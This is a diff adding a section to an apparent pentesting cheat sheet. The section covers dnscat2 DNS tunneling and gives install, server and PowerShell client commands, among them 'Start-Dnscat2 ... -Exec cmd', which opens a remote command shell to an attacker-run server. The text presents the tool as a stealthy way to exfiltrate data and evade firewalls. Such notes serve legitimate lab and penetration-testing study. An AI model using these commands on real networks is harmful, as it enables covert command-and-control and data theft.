@@ -532,6 +532,64 @@ netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42
 netsh.exe interface portproxy show v4tov4
 ```
 
+-----------------
+
+### Portforwarding with dnscat
+
+------------------
+
+- Installing dnscat2-:
+
+```cmd
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+
+![image](https://github.com/user-attachments/assets/a19e95d8-4402-4311-8eff-818a54323133)
+
+- Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
+- Setting up the server-:
+
+```bash
+sudo ruby dnscat2.rb --dns host=[your ip],port=53,domain=[domain name] --no-cache
+```
+
+- Cloning dnscat2-powershell to the Attack Host
+
+```bash
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+- Import dnscat ps1 script-:
+
+```
+Import-Module .\dnscat2.ps1
+```
+
+![image](https://github.com/user-attachments/assets/b990b509-3714-486e-980f-aa80717ae3a3)
+
+- Establish tunneling with-:
+
+```cmd
+Start-Dnscat2 -DNSserver [dns'ip] -Domain [domain] -PreSharedSecret [secret] -Exec cmd 
+```
+
+![image](https://github.com/user-attachments/assets/b3cb5adc-3757-4035-862e-ac0be35f5425)
+
+- Use `?` to list commands-:
+
+![image](https://github.com/user-attachments/assets/071ff9bb-ddbb-481f-8597-639ece0b9a53)
+
+- Interact with the established session with-:
+
+```dnscat
+window -i 1
+```
+![image](https://github.com/user-attachments/assets/17e2a137-db46-43ec-b5bb-080bd4a792f3)
+
+
+-----------------
 
 
 
